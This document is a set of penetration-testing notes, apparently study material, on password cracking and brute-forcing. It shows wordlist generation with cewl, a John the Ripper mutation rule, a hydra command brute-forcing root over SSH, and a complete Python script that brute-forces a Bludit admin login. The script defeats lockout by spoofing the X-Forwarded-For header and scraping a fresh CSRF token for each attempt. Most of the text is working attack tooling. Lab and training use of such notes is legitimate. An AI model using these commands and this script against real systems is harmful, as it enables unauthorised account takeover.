In general many pws under `/usr/share/worklists/`
# commond passwords available in kali
/usr/share/worklists/rockyou.txt

## unzip with
gunzip /usr/share/worklists/rockyou.txt.gz

# dictionary attack
* geneate wordlist by studying website, creates a file which contains works greater than six chars (-m6): `cewl www.megacorpone.com -m 6 -w megacorp-cewl.txt`
* using John the Ripper to mutate the wordlist: `sudo nano /etc/john/john.conf`
We might just add a unique rule for JTR (see adding following text in code): 
```
# Wordlist mode rules
[List.Rules:Wordlist]
# Try words as they are
:
# Lowercase every pure alphanumeric word
-c >3 !?X l Q
# Capitalize every pure alphanumeric word
-c (?a >2 !?X c Q
# Lowercase and pluralize pure alphabetic words
...
# Try the second half of split passwords
-s x_
-s-c x_ M l Q
# [Adding following:]Add two numbers to the end of each password
$[0-9]$[0-9]
```
* run to mutate the list: `john --wordlist=bigTree-cewl.txt --rules --stdout > mutated.txt` 


# HYDRA

//using username “root” with a password list on ssh with 4 parallel tasks and verbose
hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://192.168.0.13:22 -t 4 -V 

trying out hydra: with brute forcing ssh

#!/usr/bin/env python3
import re
import requests

host = 'http://192.168.194.146/bludit'
login_url = host + '/admin/login'
username = 'admin'
wordlist = []

# Generate 50 incorrect passwords
for i in range(50):
    wordlist.append('Password{i}'.format(i = i))

# Add the correct password to the end of the list
wordlist.append('adminadmin')

for password in wordlist:
    session = requests.Session()
    login_page = session.get(login_url)
    csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)

    print('[*] Trying: {p}'.format(p = password))

    headers = {
        'X-Forwarded-For': password,
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
        'Referer': login_url
    }

    data = {
        'tokenCSRF': csrf_token,
        'username': username,
        'password': password,
        'save': ''
    }

    login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)

    if 'location' in login_result.headers:
        if '/admin/dashboard' in login_result.headers['location']:
            print()
            print('SUCCESS: Password found!')
            print('Use {u}:{p} to login.'.format(u = username, p = password))
            print()
            break
